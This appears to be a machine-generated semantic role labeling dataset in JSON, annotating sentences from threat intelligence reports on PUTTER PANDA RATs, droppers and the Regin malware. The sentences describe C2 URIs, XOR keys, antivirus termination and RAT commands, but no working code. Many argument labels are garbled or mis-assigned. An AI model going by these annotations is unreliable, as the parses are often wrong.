the initial request\nshown in Figure 4": {"produced": {"ARG1": {"text": "Output data"}, "V": {"text": "produced", "index": 2}, "ARG2": {"text": "by tasking instructions"}}, "tasking": {"V": {"text": "tasking", "index": 4}, "ARG1": {"text": "instructions"}}, "is": {"ARG1": {"text": "Output data produced by tasking instructions"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "encrypted in the same manner as it was decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft / errorpost/ default.aspx?ID= , where the ID value is a random number in decimal representation \u2013 as with the initial request shown in Figure 4"}}, "encrypted": {"ARG1": {"text": "Output data produced by tasking instructions"}, "V": {"text": "encrypted", "index": 7}, "ARGM-MNR": {"text": "in the same manner/ as it was decrypted"}}, "was": {"ARG1": {"text": "it"}, "V": {"text": "was", "index": 14}, "ARG2": {"text": "decrypted"}}, "decrypted": {"ARG1": {"text": "it"}, "V": {"text": "decrypted", "index": 15}}, "sent": {"ARG1": {"text": "it"}, "V": {"text": "sent", "index": 17}, "ARGM-DIR": {"text": "back"}, "ARG2": {"text": "to the C2 server/ the form /microsoft / errorpost/ default.aspx?ID= , where the ID value is a random number in decimal representation \u2013 as with the initial request shown in"}, "ARGM-MNR": {"text": "via HTTP POST request to a URI of/ Figure 4"}}, "is_2": {"ARGM-LOC": {"text": "a URI of the form /microsoft / errorpost/ default.aspx?ID="}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the ID value"}, "V": {"text": "is", "index": 42}, "ARG2": {"text": "a random number in decimal representation \u2013"}, "ARGM-ADV": {"text": "as with the initial request shown in Figure"}}, "shown": {"ARG1": {"text": "the initial request"}, "V": {"text": "shown", "index": 55}, "ARGM-LOC": {"text": "in Figure"}}}, "\n\u2022 A victim identifier is generated from the infected machine\u2019s hard disk serial number, XOR\u2019ed with the key\nldd46!yo , and finally nibble-wise encoded as upper-case ASCII characters in the range (A-P) \u2013 e.g., the\nbyte value 0x1F becomes \u201cBP\u201d": {"is": {"V": {"text": "is", "index": 4}}, "generated": {"ARG1": {"text": "\u2022 A victim identifier"}, "V": {"text": "generated", "index": 5}, "ARG2": {"text": "from the infected machine \u2019s"}, "ARG3": {"text": "hard disk serial number"}}, "infected": {"V": {"text": "infected", "index": 8}, "ARG1": {"text": "machine \u2019s"}}, "encoded": {"ARGM-TMP": {"text": "finally"}, "ARG1": {"text": "nibble - wise"}, "V": {"text": "encoded", "index": 27}, "ARGM-PRD": {"text": "as upper - case"}, "ARGM-ADV": {"text": "ASCII characters in the range ( A - P ) \u2013 e.g."}}, "ASCII": {"V": {"text": "ASCII", "index": 32}, "ARG1": {"text": "characters"}}, "becomes": {"ARG1": {"text": "the byte value 0x1F"}, "V": {"text": "becomes", "index": 49}, "ARG2": {"text": "\u201c BP \u201d"}}}, " It is likely that this request functions as a means to authenticate\n the RAT to the C2 server and register a new victim machine with the controller": {"is": {"V": {"text": "is", "index": 1}, "ARG2": {"text": "likely"}, "ARG1": {"text": "that this request functions as a means to authenticate the RAT to the C2 server and register a new victim machine with the controller"}}, "authenticate": {"ARGM-MNR": {"text": "a means"}, "V": {"text": "authenticate", "index": 11}, "ARG1": {"text": "the RAT"}, "ARGM-GOL": {"text": "to the C2 server"}}, "register": {"ARGM-MNR": {"text": "a means"}, "V": {"text": "register", "index": 19}, "ARG1": {"text": "a new victim machine"}, "ARG2": {"text": "with the controller"}}}, " This malware also initially performs a connectivity check to www.microsoft.com using\n the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;), although in this variant no attempt is made to\n extract proxy credentials": {"performs": {"ARG0": {"text": "This malware"}, "ARGM-ADV": {"text": "also"}, "ARGM-TMP": {"text": "initially"}, "V": {"text": "performs", "index": 4}, "ARG1": {"text": "a connectivity check to www.microsoft.com using the hard - coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0"}}, "using": {"V": {"text": "using", "index": 10}, "ARG1": {"text": "the hard - coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; )"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 14}, "ARG1": {"text": "user agent Mozilla/4.0"}}, "is": {"V": {"text": "is", "index": 32}}, "made": {"V": {"text": "made", "index": 33}, "ARG1": {"text": "to extract proxy credentials"}}, "extract": {"V": {"text": "extract", "index": 35}, "ARG1": {"text": "proxy credentials"}}}, " This\n dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the\n payload to disk and executing it": {"uses": {"ARG0": {"text": "This dropper"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "RC4"}, "ARG2": {"text": "to decrypt an embedded payload from data in an embedded resource"}, "ARGM-TMP": {"text": "before writing the payload to disk and executing it"}}, "decrypt": {"ARG0": {"text": "RC4"}, "V": {"text": "decrypt", "index": 5}, "ARG1": {"text": "an embedded payload from data in an embedded resource"}, "ARGM-TMP": {"text": "before writing the payload to disk and executing it"}}, "embedded": {"V": {"text": "embedded", "index": 7}, "ARG2": {"text": "payload"}}, "embedded_2": {"V": {"text": "embedded", "index": 13}, "ARG1": {"text": "resource"}}, "writing": {"ARG0": {"text": "This dropper"}, "V": {"text": "writing", "index": 16}, "ARG1": {"text": "the payload"}, "ARG2": {"text": "to disk"}}, "disk": {"V": {"text": "disk", "index": 20}, "ARG1": {"text": "it"}}, "executing": {"ARG0": {"text": "This dropper"}, "V": {"text": "executing", "index": 22}, "ARG1": {"text": "it"}}}, "\n\n\nThe set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended\nto be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a\ncompromised system (which is consistent with its support for sleeping until a certain date/time)": {"supported": {"ARG1": {"text": "The set of commands"}, "V": {"text": "supported", "index": 4}, "ARG0": {"text": "by the RAT"}}, "is": {"ARG1": {"text": "The set of commands supported by the RAT"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "somewhat limited"}, "ARGM-ADV": {"text": "indicating that perhaps the RAT is intended to be used as a second - stage tool , or as a failsafe means for the attackers to regain basic access to a compromised system ( which is consistent with its support for sleeping until a certain date"}, "ARGM-PRD": {"text": "/ time )"}}, "indicating": {"V": {"text": "indicating", "index": 12}, "ARG1": {"text": "that perhaps the RAT is intended to be used as a second - stage tool , or as a failsafe means for the attackers to regain basic access to a compromised system ( which is consistent with its support for sleeping until a certain date / time )"}}, "is_2": {"V": {"text": "is", "index": 17}}, "intended": {"ARGM-ADV": {"text": "perhaps"}, "ARG2": {"text": "the RAT"}, "V": {"text": "intended", "index": 18}, "ARG1": {"text": "to be used as a second - stage tool"}}, "be": {"V": {"text": "be", "index": 20}}, "used": {"ARG1": {"text": "the RAT"}, "V": {"text": "used", "index": 21}, "ARG2": {"text": "as a second - stage tool"}}, "means": {"ARG0": {"text": "a failsafe"}, "V": {"text": "means", "index": 33}, "ARG2": {"text": "for the attackers"}, "ARG1": {"text": "to regain basic access to a compromised system ( which is consistent with its support for sleeping until a certain date / time"}}, "regain": {"V": {"text": "regain", "index": 38}, "ARG1": {"text": "basic access to a compromised system ( which is consistent with its support for sleeping until a certain date / time"}}, "compromised": {"V": {"text": "compromised", "index": 43}, "ARG1": {"text": "system"}}, "is_3": {"ARG1": {"text": "basic access to a compromised system ("}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 47}, "ARG2": {"text": "consistent with its support for sleeping"}, "ARGM-TMP": {"text": "until a certain date / time )"}}, "sleeping": {"V": {"text": "sleeping", "index": 53}}}, " The RATs are used by the PUTTER PANDA actors to\nconduct intelligence-gathering operations with a significant focus on the space technology sector": {"are": {"V": {"text": "are", "index": 2}}, "used": {"ARG1": {"text": "The RATs"}, "V": {"text": "used", "index": 3}, "ARG0": {"text": "by the PUTTER PANDA actors"}, "ARG2": {"text": "to conduct intelligence - gathering operations with a significant focus on the space technology sector"}}, "conduct": {"ARG0": {"text": "The RATs"}, "V": {"text": "conduct", "index": 10}, "ARG1": {"text": "intelligence - gathering operations"}, "ARGM-PRD": {"text": "with a significant focus on the space technology sector"}}, "gathering": {"ARG1": {"text": "intelligence"}, "V": {"text": "gathering", "index": 13}, "ARG0": {"text": "operations"}}}, " 3PARA\n RAT Initial Beacon</caption>\n\n\n\n\n As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using\n both GET and POST requests": {"used": {"ARG1": {"text": "the C2 protocol"}, "V": {"text": "used", "index": 13}, "ARG0": {"text": "by the 3PARA RAT"}}, "is": {"ARGM-PRD": {"text": "3PARA/ As with the 4H RAT"}, "ARG1": {"text": "the C2 protocol used by the 3PARA RAT"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "HTTP based"}, "ARGM-ADV": {"text": "using"}}, "based": {"ARG1": {"text": "the 3PARA RAT"}, "ARGM-MNR": {"text": "HTTP"}, "V": {"text": "based", "index": 20}}, "using": {"ARG0": {"text": "the C2 protocol used by the 3PARA RAT"}, "V": {"text": "using", "index": 22}, "ARG1": {"text": "both GET and POST requests"}}, "GET": {"V": {"text": "GET", "index": 24}}}, " In this case, the RAT will transmit some basic victim\n information to the C2 server along with a 256-byte hash of the hard-coded string\n HYF54&%9&jkMCXuiS": {"will": {"V": {"text": "will", "index": 6}}, "transmit": {"ARGM-LOC": {"text": "In this case"}, "ARG0": {"text": "the RAT"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "transmit", "index": 7}, "ARG1": {"text": "some basic victim information"}, "ARG2": {"text": "to the C2 server"}, "ARGM-MNR": {"text": "with a 256-byte hash of the hard - coded string HYF54&%9&jkMCXuiS"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 25}, "ARG1": {"text": "string HYF54&%9&jkMCXuiS"}}}, " If this string is not present, the C2 request is repeated\n every 0.5 seconds": {"is": {"ARG1": {"text": "this string"}, "V": {"text": "is", "index": 3}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "present"}}, "is_2": {"V": {"text": "is", "index": 10}}, "repeated": {"ARGM-ADV": {"text": "If this string is not present"}, "ARG1": {"text": "the C2 request"}, "V": {"text": "repeated", "index": 11}, "ARGM-TMP": {"text": "every 0.5 seconds"}}}, "\n\u2022 The commands supported by the RAT enable several capabilities, including:\n<list>\n   o Remote shell\n   o\n   \u0007 Listing of running processes (including loaded modules)\n   o Process termination (specified by PID)\n   o File and directory listing\n   o File upload, download, deletion, and timestamp modification\n</list>\n<footer>\n\n\n\n\n                                                                                                                    27\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n<caption>\nFigure 8": {"supported": {"ARG1": {"text": "The commands"}, "V": {"text": "supported", "index": 3}, "ARG0": {"text": "by the RAT enable several capabilities , including : Figure 8"}}, "enable": {"ARG0": {"text": "the RAT"}, "V": {"text": "enable", "index": 7}, "ARG1": {"text": "several capabilities"}}, "including": {"ARG2": {"text": "several capabilities"}, "V": {"text": "including", "index": 11}, "ARG1": {"text": "Figure 8"}}}, "\n</section>\n<footer>\n\n\n                                              7\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team</header>\n\n<section>\n                                        <heading>C2 Indicators</heading>\n                                        Although some of the domains used\n                                        for command and control of the tools\n                                        described later in this report appear\n                                        to be legitimate sites that have been\n                                        compromised in some way, many of\n                                        them appear to have been originally\n                                        registered by the operators": {"used": {"ARG1": {"text": "the domains"}, "V": {"text": "used", "index": 5}, "ARG2": {"text": "for command and control of the tools"}}, "described": {"ARG1": {"text": "the tools"}, "V": {"text": "described", "index": 13}, "ARGM-TMP": {"text": "later"}, "ARGM-LOC": {"text": "in this report"}}, "appear": {"ARG1": {"text": "some of the domains used for command and control of the tools described later in this report"}, "V": {"text": "appear", "index": 18}, "C-ARG1": {"text": "to be legitimate sites that have been compromised in some way"}}, "be": {"ARG1": {"text": "some of the domains used for command and control of the tools described later in this report"}, "V": {"text": "be", "index": 20}, "ARG2": {"text": "legitimate sites that have been compromised in some way"}}, "have": {"V": {"text": "have", "index": 24}}, "been": {"V": {"text": "been", "index": 25}}, "compromised": {"ARG1": {"text": "legitimate sites"}, "R-ARG1": {"text": "that"}, "V": {"text": "compromised", "index": 26}, "ARGM-MNR": {"text": "in some way"}}, "appear_2": {"ARGM-ADV": {"text": "Although some of the domains used for command and control of the tools described later in this report appear to be legitimate sites that have been compromised in some way"}, "ARG1": {"text": "many of them"}, "V": {"text": "appear", "index": 34}, "C-ARG1": {"text": "to have been originally registered by the operators"}}, "have_2": {"V": {"text": "have", "index": 36}}, "been_2": {"V": {"text": "been", "index": 37}}, "registered": {"ARG1": {"text": "many of them"}, "ARGM-TMP": {"text": "originally"}, "V": {"text": "registered", "index": 39}, "ARG0": {"text": "by the operators"}}}, " These are shown\nin Table 3, and may be used for command and control of PUTTER PANDA tools": {"are": {"V": {"text": "are", "index": 1}}, "shown": {"ARG1": {"text": "These"}, "V": {"text": "shown", "index": 2}, "ARGM-LOC": {"text": "in Table"}, "ARGM-EXT": {"text": "3"}}, "may": {"ARGM-MOD": {"text": "may"}}, "be": {"V": {"text": "be", "index": 9}}, "used": {"ARG1": {"text": "These"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "for command and control of PUTTER PANDA tools"}}}, "\n\n</section>\n<section> \n <heading>DROPPERS \u2013 RC4 AND XOR BASED</heading>\n Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT": {"describes": {"ARG0": {"text": "Other CrowdStrike reporting"}, "V": {"text": "describes", "index": 3}, "ARG1": {"text": "a dropper used by PUTTER PANDA ( abc.scr ) to install the 4H RAT"}}, "used": {"ARG1": {"text": "a dropper"}, "V": {"text": "used", "index": 6}, "ARG0": {"text": "by PUTTER PANDA ( abc.scr )"}}, "install": {"ARG0": {"text": "abc.scr )"}, "V": {"text": "install", "index": 14}, "ARG1": {"text": "the 4H RAT"}}}, " If Internet Explorer is used, then the malware will attempt to terminate processes\n corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)": {"is": {"V": {"text": "is", "index": 3}}, "used": {"ARG1": {"text": "Internet Explorer"}, "V": {"text": "used", "index": 4}}, "will": {"ARGM-ADV": {"text": "If Internet Explorer is used"}, "ARGM-TMP": {"text": "then"}, "ARG0": {"text": "the malware"}, "V": {"text": "will", "index": 9}, "ARG1": {"text": "attempt to terminate processes corresponding to two components of Sophos Anti - Virus ( SAVAdminService.exe and SavService.exe )"}}, "attempt": {"ARGM-ADV": {"text": "If Internet Explorer is used/ then"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 10}, "ARG1": {"text": "to terminate processes corresponding to two components of Sophos Anti - Virus ( SAVAdminService.exe and SavService.exe )"}}, "terminate": {"ARG0": {"text": "the malware"}, "V": {"text": "terminate", "index": 12}, "ARG1": {"text": "processes corresponding to two components of Sophos Anti - Virus ( SAVAdminService.exe and SavService.exe )"}}, "corresponding": {"ARG1": {"text": "processes"}, "V": {"text": "corresponding", "index": 14}, "ARG2": {"text": "to two components of Sophos Anti - Virus ( SAVAdminService.exe and SavService.exe )"}}}, "\n</section>\n<footer>\n\n\n\n                                                                25\n</footer>\n\f\n<cover>\n<heading>Technical Analysis</heading>\n</cover>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n<section>\n<heading>\nTechnical Analysis</heading>\nSeveral RATs are used by PUTTER PANDA": {"are": {"V": {"text": "are", "index": 2}}, "used": {"ARG1": {"text": "Several RATs"}, "V": {"text": "used", "index": 3}, "ARG0": {"text": "by PUTTER PANDA"}}}, "\n\n\n Once running, the RAT will load a binary representation of a date/time value<fn>13</fn> from a\n file C:\\RECYCLER\\restore.dat, and it will sleep until after this date/time has passed": {"running": {"V": {"text": "running", "index": 1}}, "will": {"ARGM-TMP": {"text": "Once running"}, "ARG0": {"text": "the RAT"}, "V": {"text": "will", "index": 5}, "ARG1": {"text": "load/ a binary representation of a date / time value from a file C:\\RECYCLER\\restore.dat"}}, "load": {"ARG0": {"text": "the RAT"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "load", "index": 6}, "ARG2": {"text": "a binary representation of a date / time value"}, "ARG1": {"text": "from a file C:\\RECYCLER\\restore.dat"}}, "will_2": {"V": {"text": "will", "index": 23}, "ARG1": {"text": "sleep"}, "ARGM-TMP": {"text": "until after this date / time has passed"}}, "sleep": {"ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "sleep", "index": 24}, "ARGM-TMP": {"text": "until after this date / time has passed"}}, "has": {"V": {"text": "has", "index": 31}}, "passed": {"ARG1": {"text": "this date / time"}, "V": {"text": "passed", "index": 32}}}, " Database\n provides a mechanism for the operators to allow the RAT to remain dormant until a\n fixed time, perhaps to allow a means of regaining access if other parts of their toolset\n are removed from a victim system": {"provides": {"ARG0": {"text": "Database"}, "V": {"text": "provides", "index": 1}, "ARG1": {"text": "a mechanism for the operators to allow the RAT to remain dormant until a fixed time ,"}, "ARGM-PRP": {"text": "perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system"}}, "allow": {"ARG0": {"text": "a mechanism/ the operators"}, "V": {"text": "allow", "index": 8}, "ARG1": {"text": "the RAT to remain dormant until a fixed time"}, "ARGM-PRP": {"text": "perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system"}}, "remain": {"ARG1": {"text": "the RAT"}, "V": {"text": "remain", "index": 12}, "ARG3": {"text": "dormant"}, "ARGM-TMP": {"text": "until a fixed time"}}, "fixed": {"V": {"text": "fixed", "index": 16}, "ARG1": {"text": "time"}}, "allow_2": {"ARGM-ADV": {"text": "perhaps"}, "V": {"text": "allow", "index": 21}, "ARG1": {"text": "a means of regaining access if other parts of their toolset are removed from a victim system"}}, "regaining": {"V": {"text": "regaining", "index": 25}, "ARG1": {"text": "access"}, "ARGM-ADV": {"text": "if other parts of their toolset are removed from a victim system"}}, "are": {"V": {"text": "are", "index": 33}}, "removed": {"ARG1": {"text": "other parts of their toolset"}, "V": {"text": "removed", "index": 34}, "ARG2": {"text": "from a victim system"}}}, " Finally, the malware will delete the content saved from the first\nrequest, and exit": {"will": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "the malware"}, "V": {"text": "will", "index": 4}, "ARG1": {"text": "delete the content saved from the first request , and exit"}}, "delete": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "delete", "index": 5}, "ARG1": {"text": "the content saved"}, "ARG2": {"text": "from the first request , and exit"}}, "saved": {"ARG1": {"text": "the content"}, "V": {"text": "saved", "index": 8}}}, " Although some of their tools are\nsimplistic, taken as a whole their toolset provides a wide degree of control\nover a victim system and can provide the opportunity to deploy additional\ntools at will": {"are": {"ARG1": {"text": "some of their tools"}, "V": {"text": "are", "index": 5}, "ARG2": {"text": "simplistic"}}, "taken": {"ARG1": {"text": "some of their tools"}, "V": {"text": "taken", "index": 8}, "ARGM-MNR": {"text": "as a whole their toolset"}}, "provides": {"ARGM-ADV": {"text": "Although some of their tools are simplistic"}, "ARG0": {"text": "taken as a whole their toolset"}, "V": {"text": "provides", "index": 14}, "ARG1": {"text": "a wide degree of control over a victim system"}}, "can": {"V": {"text": "can", "index": 25}}, "provide": {"ARGM-ADV": {"text": "Although some of their tools are simplistic"}, "ARG0": {"text": "taken as a whole their toolset"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "provide", "index": 26}, "ARG1": {"text": "the opportunity to deploy additional tools at will"}}, "deploy": {"V": {"text": "deploy", "index": 30}, "ARG1": {"text": "additional tools"}, "ARGM-LOC": {"text": "at will"}}, "will": {"V": {"text": "will", "index": 34}}}, " Two droppers have been associated with the\nPUTTER PANDA toolset; these are also briefly examined below": {"have": {"V": {"text": "have", "index": 2}}, "been": {"V": {"text": "been", "index": 3}}, "associated": {"ARG1": {"text": "Two droppers"}, "V": {"text": "associated", "index": 4}, "ARG2": {"text": "with the PUTTER PANDA toolset"}}, "are": {"V": {"text": "are", "index": 12}}, "examined": {"ARG1": {"text": "these"}, "ARGM-ADV": {"text": "also"}, "ARGM-TMP": {"text": "briefly"}, "V": {"text": "examined", "index": 15}, "ARGM-DIR": {"text": "below"}}}, "\n Four examples of these droppers were located, using a mixture of decoy PDF and Microsoft Word documents\n (shown below in Figures 15-18)": {"were": {"V": {"text": "were", "index": 5}}, "located": {"ARG1": {"text": "Four examples of these droppers"}, "V": {"text": "located", "index": 6}, "ARGM-PRD": {"text": "using a mixture of decoy PDF and Microsoft Word documents ( shown below in Figures 15 - 18 )"}}, "using": {"V": {"text": "using", "index": 8}, "ARG1": {"text": "a mixture of decoy PDF and Microsoft Word documents ( shown below"}}, "shown": {"ARG0": {"text": "Microsoft Word documents ("}, "V": {"text": "shown", "index": 19}, "ARGM-LOC": {"text": "below in Figures 15 - 18 )"}}}, "\n\u2022 Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE": {"is": {"ARG1": {"text": "\u2022 Communication to and from the C2 server"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "obfuscated using a 1-byte XOR with the key 0xBE"}}, "obfuscated": {"ARG1": {"text": "\u2022 Communication to and from the C2 server"}, "V": {"text": "obfuscated", "index": 9}, "ARG2": {"text": "using a 1-byte XOR with the key 0xBE"}}, "using": {"V": {"text": "using", "index": 10}, "ARG1": {"text": "a 1-byte XOR"}, "ARG2": {"text": "with the key 0xBE"}}}, "\n\n\nThe limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-\nand-execute utility": {"implies": {"ARG0": {"text": "The limited functionality , and lack of persistence of this tool"}, "V": {"text": "implies", "index": 12}, "ARG1": {"text": "that it is used only as a simple download- and - execute utility"}}, "is": {"V": {"text": "is", "index": 15}}, "used": {"ARG1": {"text": "it"}, "V": {"text": "used", "index": 16}, "ARG2": {"text": "only as a simple download- and - execute utility"}}, "execute": {"V": {"text": "execute", "index": 24}, "ARG1": {"text": "utility"}}}, "\n\n\u2794 \u0007They focus their exploits against\n popular productivity applications\n such as Adobe Reader and Microsoft\n    Office to deploy custom malware\n through targeted email attacks": {"focus": {"V": {"text": "focus", "index": 2}, "ARG1": {"text": "their exploits"}, "ARG2": {"text": "against popular productivity applications such as Adobe Reader and Microsoft Office to deploy custom malware through targeted email attacks"}}, "deploy": {"V": {"text": "deploy", "index": 17}, "ARG1": {"text": "custom malware through targeted email attacks"}}, "targeted": {"V": {"text": "targeted", "index": 21}, "ARG1": {"text": "email attacks"}}}, " This is used to prevent multiple instances of\nthe RAT being executed simultaneously": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "used to prevent multiple instances of the RAT being executed simultaneously"}}, "used": {"ARG1": {"text": "This"}, "V": {"text": "used", "index": 2}, "ARG2": {"text": "to prevent multiple instances of the RAT being executed simultaneously"}}, "prevent": {"V": {"text": "prevent", "index": 4}, "ARG1": {"text": "multiple instances of the RAT being executed simultaneously"}}, "being": {"V": {"text": "being", "index": 10}}, "executed": {"ARG1": {"text": "the RAT"}, "V": {"text": "executed", "index": 11}, "ARGM-MNR": {"text": "simultaneously"}}}, " Finally, the dropper deletes itself via a batch file": {"deletes": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "the dropper"}, "V": {"text": "deletes", "index": 4}, "ARG1": {"text": "itself"}, "ARGM-MNR": {"text": "via a batch file"}}}, " They focus their exploits against popular productivity\napplications such as Adobe Reader and Microsoft Office to deploy custom malware through\ntargeted email attacks": {"focus": {"ARG0": {"text": "They"}, "V": {"text": "focus", "index": 1}, "ARG1": {"text": "their exploits"}, "ARG2": {"text": "against popular productivity applications such as Adobe Reader and Microsoft Office to deploy custom malware through targeted email attacks"}}, "deploy": {"V": {"text": "deploy", "index": 16}, "ARG1": {"text": "custom malware through targeted email attacks"}}, "targeted": {"V": {"text": "targeted", "index": 20}, "ARG1": {"text": "email attacks"}}}, "\n\u2022 A series of HTTP requests characterizes the RAT\u2019s C2": {"characterizes": {"ARG0": {"text": "\u2022 A series of HTTP requests"}, "V": {"text": "characterizes", "index": 6}, "ARG1": {"text": "the RAT \u2019s C2"}}}, " Targets may be tricked into\n    visiting spoofed versions of well-\n    known websites and the threat may\n    be installed through a web browser\n    or by exploiting an application": {"may": {"V": {"text": "may", "index": 1}}, "be": {"V": {"text": "be", "index": 2}}, "tricked": {"ARG1": {"text": "Targets"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "tricked", "index": 3}, "ARGM-CAU": {"text": "into visiting spoofed versions of well- known websites"}}, "visiting": {"V": {"text": "visiting", "index": 5}, "ARG1": {"text": "spoofed versions"}}, "spoofed": {"V": {"text": "spoofed", "index": 6}, "ARG0": {"text": "versions"}}, "known": {"ARGM-MNR": {"text": "well-"}, "V": {"text": "known", "index": 10}, "ARG1": {"text": "websites"}}, "may_2": {"V": {"text": "may", "index": 15}}, "be_2": {"V": {"text": "be", "index": 16}}, "installed": {"ARG1": {"text": "the threat"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "installed", "index": 17}, "ARG2": {"text": "through a web browser"}}, "exploiting": {"ARG0": {"text": "the threat"}, "V": {"text": "exploiting", "index": 24}, "ARG1": {"text": "an application"}}}, " For example, one module was designed to\n    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed\n    to collect administration traffic for mobile telephony base station controllers, while another was created\n    specifically for parsing mail from Exchange databases": {"was": {"V": {"text": "was", "index": 5}}, "designed": {"ARG1": {"text": "one module"}, "V": {"text": "designed", "index": 6}, "ARG3": {"text": "to monitor network traffic to Microsoft Internet Information Services ( IIS ) web servers"}}, "monitor": {"ARG0": {"text": "one module"}, "V": {"text": "monitor", "index": 8}, "ARG1": {"text": "network traffic"}, "ARG2": {"text": "to Microsoft Internet Information Services ( IIS ) web servers"}}, "was_2": {"V": {"text": "was", "index": 23}}, "designed_2": {"ARG1": {"text": "another"}, "V": {"text": "designed", "index": 24}, "ARG3": {"text": "to collect administration traffic for mobile telephony base station controllers"}, "ARGM-ADV": {"text": "while another was created specifically for parsing mail from Exchange databases"}}, "collect": {"ARG0": {"text": "another"}, "V": {"text": "collect", "index": 26}, "ARG1": {"text": "administration traffic for mobile telephony base station controllers"}}, "was_3": {"V": {"text": "was", "index": 38}}, "created": {"ARG1": {"text": "another"}, "V": {"text": "created", "index": 39}, "ARGM-PRP": {"text": "specifically for parsing mail from Exchange databases"}}, "parsing": {"V": {"text": "parsing", "index": 42}, "ARG1": {"text": "mail"}}}, " The threat\u2019s standard capabilities include several remote access Trojan (RAT) features, such as\n    capturing screenshots and taking control of the mouse\u2019s point-and-click functions": {"include": {"ARG2": {"text": "The threat \u2019s standard capabilities"}, "V": {"text": "include", "index": 5}, "ARG1": {"text": "several remote access Trojan ( RAT ) features , such as capturing screenshots and taking control of the mouse \u2019s point - and - click functions"}}, "features": {"ARG0": {"text": "several remote access Trojan"}, "ARGM-ADJ": {"text": "( RAT )/ such as capturing screenshots and taking control of the mouse \u2019s point - and - click functions"}, "V": {"text": "features", "index": 13}}, "capturing": {"V": {"text": "capturing", "index": 17}, "ARG1": {"text": "screenshots"}}, "taking": {"ARG0": {"text": "access Trojan ( RAT ) features"}, "V": {"text": "taking", "index": 20}, "ARG1": {"text": "control"}, "ARG2": {"text": "of the mouse \u2019s point - and - click functions"}}}, " On\n    one computer, log files show that\n    Regin originated from Yahoo! Instant\n    Messenger through an unconfirmed\n    exploit": {"log": {"V": {"text": "log", "index": 4}, "ARG0": {"text": "files"}}, "show": {"ARGM-MNR": {"text": "On one computer"}, "ARG0": {"text": "log files"}, "V": {"text": "show", "index": 6}, "ARG1": {"text": "that Regin originated from Yahoo ! Instant Messenger through an unconfirmed exploit"}}, "originated": {"ARG1": {"text": "Regin"}, "V": {"text": "originated", "index": 9}, "ARG2": {"text": "from Yahoo"}, "ARGM-MNR": {"text": "through an unconfirmed exploit"}}}, " All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel": {"are": {"ARG1": {"text": "All communications"}, "V": {"text": "are", "index": 2}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "All communications"}, "ARGM-MNR": {"text": "strongly"}, "V": {"text": "encrypted", "index": 4}}, "can": {"V": {"text": "can", "index": 6}}, "happen": {"ARG1": {"text": "All communications"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "happen", "index": 7}, "ARGM-MNR": {"text": "in a two - stage fashion"}, "ARGM-LOC": {"text": "where the attacker may contact a compromised computer using one channel to instruct it to begin communications on a different channel"}}, "may": {"V": {"text": "may", "index": 17}}, "contact": {"ARGM-LOC": {"text": "a two - stage fashion"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "contact", "index": 18}, "ARG1": {"text": "a compromised computer"}, "ARGM-PRD": {"text": "using one channel to instruct it to begin communications on a different channel"}}, "compromised": {"V": {"text": "compromised", "index": 20}, "ARG1": {"text": "computer"}}, "using": {"ARG0": {"text": "a compromised computer"}, "V": {"text": "using", "index": 22}, "ARG1": {"text": "one channel"}, "ARG2": {"text": "to instruct it to begin communications on a different channel"}}, "instruct": {"V": {"text": "instruct", "index": 26}, "ARG1": {"text": "it"}, "ARGM-PRP": {"text": "to begin communications on a different channel"}}, "begin": {"V": {"text": "begin", "index": 29}, "ARG1": {"text": "communications on a different channel"}}}, "\n<list>\n  \u2022\t UDP: Raw UDP payload\n  \u2022\t TCP: Raw TCP payload\n</list>\n  \u2022\t HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID,\n     SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, 